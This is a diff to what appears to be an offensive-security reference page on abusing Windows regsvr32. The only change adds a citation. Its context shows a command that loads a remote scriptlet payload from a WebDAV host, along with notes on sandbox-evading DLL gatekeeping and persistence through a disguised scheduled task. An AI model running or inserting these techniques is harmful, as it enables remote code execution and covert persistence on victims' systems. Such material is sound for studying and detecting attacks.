@@ -269,7 +269,7 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 
 #### Regsvr32 – arbitrary DLL export with /i argument (gatekeeping & persistence)
 
-Besides loading remote scriptlets (`scrobj.dll`), `regsvr32.exe` will load a local DLL and invoke its `DllRegisterServer`/`DllUnregisterServer` exports. Custom loaders frequently abuse this to execute arbitrary code while blending with a signed LOLBin. Two tradecraft notes seen in the wild:
+Besides loading remote scriptlets (`scrobj.dll`), `regsvr32.exe` will load a local DLL and invoke its `DllRegisterServer`/`DllUnregisterServer` exports. Custom loaders frequently abuse this to execute arbitrary code while blending with a signed LOLBin. Two tradecraft notes seen in the wild:<sup>[[8]](#references)</sup>
 
 - Gatekeeping argument: the DLL exits unless a specific switch is passed via `/i:<arg>`, e.g. `/i:--type=renderer` to mimic Chromium renderer children. This reduces accidental execution and frustrates sandboxes.
 - Persistence: schedule `regsvr32` to run the DLL with silent + high privileges and the required `/i` argument, masquerading as an updater task:
